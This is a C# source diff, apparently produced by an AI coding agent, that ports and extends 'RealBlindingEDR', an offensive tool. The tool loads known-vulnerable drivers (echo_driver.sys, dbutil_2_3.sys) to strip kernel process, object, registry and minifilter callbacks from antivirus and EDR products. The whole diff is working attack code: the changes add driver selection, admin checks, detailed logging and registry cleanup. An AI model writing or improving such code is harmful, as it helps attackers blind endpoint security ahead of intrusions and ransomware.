@@ -10,8 +10,8 @@ namespace RealBlindingEDR
 {
     class Program
     {
-        // Constants
-        private const int DriverType = 1; // 1 for echo_driver.sys, 2 for dbutil_2_3.sys
+        // Constants and settings
+        private static int DriverType = 1; // 1 for echo_driver.sys, 2 for dbutil_2_3.sys
         private const string DrivePath = @"C:\ProgramData\echo_driver.sys";
 
         // AV/EDR driver names to clear
@@ -136,20 +136,83 @@ namespace RealBlindingEDR
         // Main method
         static void Main(string[] args)
         {
-            RtlGetNtVersionNumbers(out dwMajor, out dwMinorVersion, out dwBuild);
-            dwBuild &= 0xffff;
+            try
+            {
+                Console.WriteLine("=== RealBlindingEDR C# 版本 ===");
+                Console.WriteLine("原作者: @Hagrid29");
+                Console.WriteLine("C#移植: OpenHands");
+                Console.WriteLine("开始执行程序...\n");
 
-            if (!InitialDriver())
-                return;
+                // 处理命令行参数
+                if (args.Length > 0)
+                {
+                    Console.WriteLine($"[调试] 收到命令行参数: {string.Join(", ", args)}");
+                    if (args[0] == "1")
+                    {
+                        DriverType = 1;
+                        Console.WriteLine("[信息] 使用EchoDrv驱动");
+                    }
+                    else if (args[0] == "2")
+                    {
+                        DriverType = 2;
+                        Console.WriteLine("[信息] 使用DBUtil驱动");
+                    }
+                    else
+                    {
+                        Console.WriteLine($"[警告] 未知的驱动类型参数: {args[0]}，使用默认驱动类型: {DriverType}");
+                    }
+                }
+                else
+                {
+                    Console.WriteLine($"[信息] 未指定驱动类型，使用默认驱动类型: {DriverType}");
+                }
 
-            ClearThreeCallBack();
-            ClearObRegisterCallbacks();
-            ClearCmRegisterCallback();
-            ClearMiniFilterCallback();
+                Console.WriteLine("[信息] 获取Windows版本信息...");
+                RtlGetNtVersionNumbers(out dwMajor, out dwMinorVersion, out dwBuild);
+                dwBuild &= 0xffff;
+                Console.WriteLine($"[信息] Windows版本: {dwMajor}.{dwMinorVersion}.{dwBuild}");
 
-            UnloadDrive();
-            Console.WriteLine("Press any key to continue...");
-            Console.ReadKey();
+                if (!IsAdministrator())
+                {
+                    Console.WriteLine("[错误] 请以管理员身份运行此程序！");
+                    return;
+                }
+                Console.WriteLine("[信息] 管理员权限检查通过");
+
+                Console.WriteLine("[信息] 开始初始化驱动...");
+                if (!InitialDriver())
+                {
+                    Console.WriteLine("[错误] 驱动初始化失败！");
+                    return;
+                }
+                Console.WriteLine("[成功] 驱动初始化成功！");
+
+                Console.WriteLine("\n[信息] 开始清除进程/线程/镜像加载回调...");
+                ClearThreeCallBack();
+                
+                Console.WriteLine("\n[信息] 开始清除对象回调...");
+                ClearObRegisterCallbacks();
+                
+                Console.WriteLine("\n[信息] 开始清除注册表回调...");
+                ClearCmRegisterCallback();
+                
+                Console.WriteLine("\n[信息] 开始清除文件系统微过滤器回调...");
+                ClearMiniFilterCallback();
+
+                Console.WriteLine("\n[信息] 开始卸载驱动...");
+                UnloadDrive();
+                Console.WriteLine("[成功] 驱动卸载完成");
+                
+                Console.WriteLine("\n程序执行完毕。按任意键继续...");
+                Console.ReadKey();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"\n[严重错误] 程序执行过程中发生异常: {ex.Message}");
+                Console.WriteLine($"异常详情: {ex}");
+                Console.WriteLine("\n按任意键退出...");
+                Console.ReadKey();
+            }
         }
 
         // Load the driver
@@ -157,57 +220,95 @@ namespace RealBlindingEDR
         {
             try
             {
+                Console.WriteLine("[调试] 开始加载驱动...");
+                string driverPath = "";
+                
+                if (DriverType == 1)
+                {
+                    driverPath = @"C:\ProgramData\echo_driver.sys";
+                    Console.WriteLine($"[调试] 使用EchoDrv驱动路径: {driverPath}");
+                }
+                else if (DriverType == 2)
+                {
+                    driverPath = @"C:\ProgramData\dbutil_2_3.sys";
+                    Console.WriteLine($"[调试] 使用DBUtil驱动路径: {driverPath}");
+                }
+                
+                // 检查驱动文件是否存在
+                if (!System.IO.File.Exists(driverPath))
+                {
+                    Console.WriteLine($"[错误] 驱动文件不存在: {driverPath}");
+                    return false;
+                }
+                Console.WriteLine("[调试] 驱动文件存在，继续加载过程");
+                
+                Console.WriteLine("[调试] 创建注册表项...");
                 using (RegistryKey hKey = Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet", true))
                 {
                     if (hKey == null)
+                    {
+                        Console.WriteLine("[错误] 无法打开注册表项: System\\CurrentControlSet");
                         return false;
+                    }
 
                     RegistryKey hsubkey = hKey.CreateSubKey("RealBlindingEDR");
                     if (hsubkey == null)
+                    {
+                        Console.WriteLine("[错误] 无法创建注册表项: RealBlindingEDR");
                         return false;
+                    }
 
-                    string pdata = "\\??\\" + DrivePath;
+                    string pdata = "\\??\\" + driverPath;
+                    Console.WriteLine($"[调试] 设置驱动路径: {pdata}");
                     hsubkey.SetValue("ImagePath", pdata, RegistryValueKind.ExpandString);
                     hsubkey.SetValue("Type", 1, RegistryValueKind.DWord);
+                    Console.WriteLine("[调试] 注册表配置完成");
                 }
 
+                Console.WriteLine("[调试] 创建服务注册表项...");
                 using (RegistryKey hKey = Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet\\services", true))
                 {
                     if (hKey == null)
                     {
-                        Console.WriteLine("Step3 Error");
+                        Console.WriteLine("[错误] 无法打开服务注册表项");
                         return false;
                     }
 
                     hKey.CreateSubKey("RealBlindingEDR");
+                    Console.WriteLine("[调试] 服务注册表项创建成功");
                 }
 
+                Console.WriteLine("[调试] 调整权限...");
                 uint previousState;
                 uint status = RtlAdjustPrivilege(0xa, true, false, out previousState);
 
                 if (status != 0)
                 {
-                    Console.WriteLine("Step5 Error");
+                    Console.WriteLine($"[错误] 调整权限失败，状态码: {status:X}");
                     return false;
                 }
+                Console.WriteLine("[调试] 权限调整成功");
 
+                Console.WriteLine("[调试] 加载驱动...");
                 UNICODE_STRING szSymbolicLink = new UNICODE_STRING();
                 RtlInitUnicodeString(ref szSymbolicLink, "\\Registry\\Machine\\System\\CurrentControlSet\\RealBlindingEDR");
                 uint errcode = NtLoadDriver(ref szSymbolicLink);
 
                 if (errcode >= 0)
                 {
+                    Console.WriteLine("[调试] 驱动加载成功");
                     return true;
                 }
                 else
                 {
-                    Console.WriteLine($"Error Code: {errcode:X}");
+                    Console.WriteLine($"[错误] 驱动加载失败，错误码: {errcode:X}");
                     return false;
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Reg Add Error: {ex.Message}");
+                Console.WriteLine($"[严重错误] 加载驱动时发生异常: {ex.Message}");
+                Console.WriteLine($"异常详情: {ex}");
                 return false;
             }
         }
@@ -215,108 +316,183 @@ namespace RealBlindingEDR
         // Unload the driver
         private static void UnloadDrive()
         {
-            uint previousState;
-            uint status = RtlAdjustPrivilege(0xa, true, false, out previousState);
-            if (status != 0)
+            try
             {
-                Console.WriteLine("Unload Driver Error 2");
-                return;
-            }
+                Console.WriteLine("[调试] 开始卸载驱动...");
+                
+                Console.WriteLine("[调试] 调整权限...");
+                uint previousState;
+                uint status = RtlAdjustPrivilege(0xa, true, false, out previousState);
+                if (status != 0)
+                {
+                    Console.WriteLine($"[错误] 调整权限失败，状态码: {status:X}");
+                    return;
+                }
+                Console.WriteLine("[调试] 权限调整成功");
 
-            UNICODE_STRING szSymbolicLink = new UNICODE_STRING();
-            RtlInitUnicodeString(ref szSymbolicLink, "\\Registry\\Machine\\System\\CurrentControlSet\\RealBlindingEDR");
-            uint errcode = NtUnloadDriver(ref szSymbolicLink);
+                Console.WriteLine("[调试] 卸载驱动...");
+                UNICODE_STRING szSymbolicLink = new UNICODE_STRING();
+                RtlInitUnicodeString(ref szSymbolicLink, "\\Registry\\Machine\\System\\CurrentControlSet\\RealBlindingEDR");
+                uint errcode = NtUnloadDriver(ref szSymbolicLink);
 
-            if (errcode >= 0)
-            {
-                Console.WriteLine("Driver uninstalled successfully.");
+                if (errcode >= 0)
+                {
+                    Console.WriteLine("[成功] 驱动卸载成功");
+                    
+                    try
+                    {
+                        Console.WriteLine("[调试] 清理注册表...");
+                        Registry.LocalMachine.DeleteSubKey("System\\CurrentControlSet\\RealBlindingEDR", false);
+                        Registry.LocalMachine.DeleteSubKey("System\\CurrentControlSet\\services\\RealBlindingEDR", false);
+                        Console.WriteLine("[调试] 注册表清理完成");
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"[警告] 清理注册表时发生异常: {ex.Message}");
+                    }
+                }
+                else
+                {
+                    Console.WriteLine($"[错误] 驱动卸载失败，错误码: {errcode:X}");
+                }
             }
-            else
+            catch (Exception ex)
             {
-                Console.WriteLine($"Unload Driver Error: {errcode:X}");
+                Console.WriteLine($"[严重错误] 卸载驱动时发生异常: {ex.Message}");
+                Console.WriteLine($"异常详情: {ex}");
             }
         }
 
         // Initialize the driver
         private static bool InitialDriver()
         {
-            switch (DriverType)
+            try
             {
-                case 1:
-                    hDevice = CreateFile("\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
-                    if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
-                    {
-                        if (LoadDriver())
+                Console.WriteLine($"[调试] 初始化驱动类型: {DriverType}");
+                
+                switch (DriverType)
+                {
+                    case 1:
+                        Console.WriteLine("[调试] 尝试打开EchoDrv驱动...");
+                        hDevice = CreateFile("\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+                        
+                        if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
                         {
-                            Console.WriteLine("Driver loaded successfully.");
-                            hDevice = CreateFile("\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+                            int lastError = Marshal.GetLastWin32Error();
+                            Console.WriteLine($"[调试] 打开驱动失败，错误码: {lastError}，尝试加载驱动...");
+                            
+                            if (LoadDriver())
+                            {
+                                Console.WriteLine("[信息] 驱动加载成功，重新尝试打开驱动...");
+                                hDevice = CreateFile("\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+                                
+                                if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
+                                {
+                                    lastError = Marshal.GetLastWin32Error();
+                                    Console.WriteLine($"[错误] 加载后仍无法打开驱动，错误码: {lastError}");
+                                    return false;
+                                }
+                            }
+                            else
+                            {
+                                Console.WriteLine("[错误] 驱动加载失败");
+                                return false;
+                            }
                         }
-                        else
+                        Console.WriteLine("[调试] 驱动句柄获取成功");
+
+                        Console.WriteLine("[调试] 分配内存缓冲区...");
+                        IntPtr buf = Marshal.AllocHGlobal(4096);
+                        uint bytesRet = 0;
+                        
+                        Console.WriteLine("[调试] 发送IOCTL_ECHO_HELLO命令...");
+                        bool success = DeviceIoControl(hDevice, IOCTL_ECHO_HELLO, IntPtr.Zero, 0, buf, 4096, out bytesRet, IntPtr.Zero);
+                        if (!success)
                         {
-                            Console.WriteLine("Driver loading failed.");
+                            int lastError = Marshal.GetLastWin32Error();
+                            Console.WriteLine($"[错误] 初始化驱动失败，错误码: {lastError}");
+                            CloseHandle(hDevice);
+                            Marshal.FreeHGlobal(buf);
                             return false;
                         }
-                    }
+                        Console.WriteLine("[调试] IOCTL_ECHO_HELLO命令成功");
 
-                    IntPtr buf = Marshal.AllocHGlobal(4096);
-                    uint bytesRet = 0;
-                    bool success = DeviceIoControl(hDevice, IOCTL_ECHO_HELLO, IntPtr.Zero, 0, buf, 4096, out bytesRet, IntPtr.Zero);
-                    if (!success)
-                    {
-                        Console.WriteLine($"Failed to initialize driver 1, {Marshal.GetLastWin32Error()}");
-                        CloseHandle(hDevice);
-                        Marshal.FreeHGlobal(buf);
-                        return false;
-                    }
+                        Console.WriteLine("[调试] 准备获取进程句柄...");
+                        int currentPid = Process.GetCurrentProcess().Id;
+                        Console.WriteLine($"[调试] 当前进程ID: {currentPid}");
+                        
+                        GetHandle param = new GetHandle
+                        {
+                            pid = (uint)currentPid,
+                            access = GENERIC_READ | GENERIC_WRITE
+                        };
 
-                    GetHandle param = new GetHandle
-                    {
-                        pid = (uint)Process.GetCurrentProcess().Id,
-                        access = GENERIC_READ | GENERIC_WRITE
-                    };
+                        IntPtr paramPtr = Marshal.AllocHGlobal(Marshal.SizeOf(param));
+                        Marshal.StructureToPtr(param, paramPtr, false);
 
-                    IntPtr paramPtr = Marshal.AllocHGlobal(Marshal.SizeOf(param));
-                    Marshal.StructureToPtr(param, paramPtr, false);
+                        Console.WriteLine("[调试] 发送IOCTL_ECHO_GET_HANDLE命令...");
+                        success = DeviceIoControl(hDevice, IOCTL_ECHO_GET_HANDLE, paramPtr, (uint)Marshal.SizeOf(param), paramPtr, (uint)Marshal.SizeOf(param), out bytesRet, IntPtr.Zero);
+                        if (!success)
+                        {
+                            int lastError = Marshal.GetLastWin32Error();
+                            Console.WriteLine($"[错误] 获取进程句柄失败，错误码: {lastError}");
+                            CloseHandle(hDevice);
+                            Marshal.FreeHGlobal(paramPtr);
+                            Marshal.FreeHGlobal(buf);
+                            return false;
+                        }
 
-                    success = DeviceIoControl(hDevice, IOCTL_ECHO_GET_HANDLE, paramPtr, (uint)Marshal.SizeOf(param), paramPtr, (uint)Marshal.SizeOf(param), out bytesRet, IntPtr.Zero);
-                    if (!success)
-                    {
-                        Console.WriteLine($"Failed to initialize driver 2, {Marshal.GetLastWin32Error()}");
-                        CloseHandle(hDevice);
+                        param = (GetHandle)Marshal.PtrToStructure(paramPtr, typeof(GetHandle));
+                        ProcessHandle = param.handle;
+                        Console.WriteLine($"[调试] 获取进程句柄成功: 0x{ProcessHandle.ToInt64():X}");
+
                         Marshal.FreeHGlobal(paramPtr);
                         Marshal.FreeHGlobal(buf);
+                        break;
+                        
+                    case 2:
+                        Console.WriteLine("[调试] 尝试打开DBUtil_2_3驱动...");
+                        hDevice = CreateFile("\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+                        
+                        if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
+                        {
+                            int lastError = Marshal.GetLastWin32Error();
+                            Console.WriteLine($"[调试] 打开驱动失败，错误码: {lastError}，尝试加载驱动...");
+                            
+                            if (LoadDriver())
+                            {
+                                Console.WriteLine("[信息] 驱动加载成功，重新尝试打开驱动...");
+                                hDevice = CreateFile("\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+                                
+                                if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
+                                {
+                                    lastError = Marshal.GetLastWin32Error();
+                                    Console.WriteLine($"[错误] 加载后仍无法打开驱动，错误码: {lastError}");
+                                    return false;
+                                }
+                            }
+                            else
+                            {
+                                Console.WriteLine("[错误] 驱动加载失败");
+                                return false;
+                            }
+                        }
+                        Console.WriteLine("[调试] DBUtil_2_3驱动句柄获取成功");
+                        break;
+                        
+                    default:
+                        Console.WriteLine("[错误] 指定了无效的驱动类型");
                         return false;
-                    }
-
-                    param = (GetHandle)Marshal.PtrToStructure(paramPtr, typeof(GetHandle));
-                    ProcessHandle = param.handle;
-
-                    Marshal.FreeHGlobal(paramPtr);
-                    Marshal.FreeHGlobal(buf);
-                    break;
-                    
-                case 2:
-                    hDevice = CreateFile("\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
-                    if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
-                    {
-                        if (LoadDriver())
-                        {
-                            Console.WriteLine("Driver loaded successfully.");
-                            hDevice = CreateFile("\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
-                        }
-                        else
-                        {
-                            Console.WriteLine("Driver loading failed.");
-                            return false;
-                        }
-                    }
-                    break;
-                    
-                default:
-                    Console.WriteLine("Invalid driver type specified.");
-                    return false;
+                }
+                
+                return true;
             }
-            return true;
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[严重错误] 初始化驱动时发生异常: {ex.Message}");
+                Console.WriteLine($"异常详情: {ex}");
+                return false;
+            }
         }
 
         // Read memory using Dell driver
